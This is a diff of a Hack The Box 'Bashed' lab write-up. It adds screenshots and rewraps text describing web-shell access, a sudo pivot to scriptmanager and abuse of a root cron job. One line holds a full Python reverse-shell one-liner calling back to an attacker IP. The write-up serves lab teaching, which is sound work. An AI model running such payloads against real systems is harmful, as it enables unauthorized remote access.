@@ -17,6 +17,8 @@ in. From there it's a short hop through a cron-driven script directory to root.
 An initial Nmap scan showed only one open port — 80/tcp, HTTP. With nothing else
 exposed, the web application was the entire attack surface from the start.
 
+![Nmap scan output](/assets/img/htb-bashed/01-nmap-scan.png)
+
 ## Web Enumeration
 
 Browsing the site turned up a page called `arrexel`, which led into the site's
@@ -26,7 +28,11 @@ that it had been developed directly on this server. That's about as strong a hin
 as a box gives: the tool is hosted somewhere on the site itself, and finding it is
 the intended path.
 
+![Blog post advertising phpbash](/assets/img/htb-bashed/02-blog-post.png)
+
 That pointed straight at directory enumeration to locate it.
+
+![phpbash tool page](/assets/img/htb-bashed/03-phpbash-page.png)
 
 ## Directory Enumeration
 
@@ -37,10 +43,14 @@ directory, which held two PHP files running as `www-data`. One of them was
 `phpbash.php` — the exact tool the blog post had pointed to — and browsing to it
 dropped straight into a functional web shell.
 
+![ffuf directory enumeration results](/assets/img/htb-bashed/04-ffuf-directory-enum.png)
+
 ## Getting a Shell
 
 From `phpbash.php`, I had command execution as `www-data` and started basic
 enumeration — checking the current user, available binaries, and permissions.
+
+![Initial shell enumeration](/assets/img/htb-bashed/05-shell-enum.png)
 
 Worth noting: this phpbash interface isn't a real interactive TTY (no PTY
 allocated), so anything requiring terminal input — `su`, `passwd`, some `sudo`
@@ -53,16 +63,22 @@ Checking sudo permissions:
 sudo -l
 ```
 
-`www-data` could run any command as a user called `scriptmanager`, no password
-required. Confirmed that worked, then went looking for what that user could
-actually reach — specifically, which directories were writable by
-`scriptmanager` system-wide.
+![sudo -l output](/assets/img/htb-bashed/06-sudo-l.png)
 
-That search turned up `/scripts`, writable by `scriptmanager`. That's almost
-certainly a drop zone a root-owned cron job is watching. Before writing anything
-into it, it's worth checking what's already there — the existing file
-name/extension usually tells you which interpreter is executing it. Inside
-`/scripts` sat two files: `test.py` and `test.txt`.
+`www-data` could run any command as a user called `scriptmanager`, no password
+required. Confirmed that worked:
+
+![Confirming command execution as scriptmanager](/assets/img/htb-bashed/07-scriptmanager-confirm.png)
+
+Then went looking for what that user could actually reach — specifically, which
+directories were writable by `scriptmanager` system-wide. That search turned up
+`/scripts`, writable by `scriptmanager`. That's almost certainly a drop zone a
+root-owned cron job is watching. Before writing anything into it, it's worth
+checking what's already there — the existing file name/extension usually tells
+you which interpreter is executing it. Inside `/scripts` sat two files: `test.py`
+and `test.txt`.
+
+![Contents of the writable /scripts directory](/assets/img/htb-bashed/08-scripts-directory.png)
 
 Reading the Python file confirmed it was a disposable test script — safe to
 overwrite with a reverse shell payload:
@@ -90,6 +106,8 @@ separator:
 sudo -u scriptmanager bash -c "echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<attacker-ip>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' > /scripts/test.py"
 ```
 
+![Writing the one-line reverse shell payload](/assets/img/htb-bashed/09-reverse-shell-payload.png)
+
 With a Netcat listener running and the cron job picking up the overwritten
 script, this triggered a reverse shell running as `scriptmanager`.
 
@@ -97,6 +115,8 @@ script, this triggered a reverse shell running as `scriptmanager`.
 
 From there, a search through the filesystem turned up both the user and root
 flags, confirming full compromise.
+
+![Root and user flags](/assets/img/htb-bashed/10-root-flag.png)
 
 ## Attack Chain Summary
 
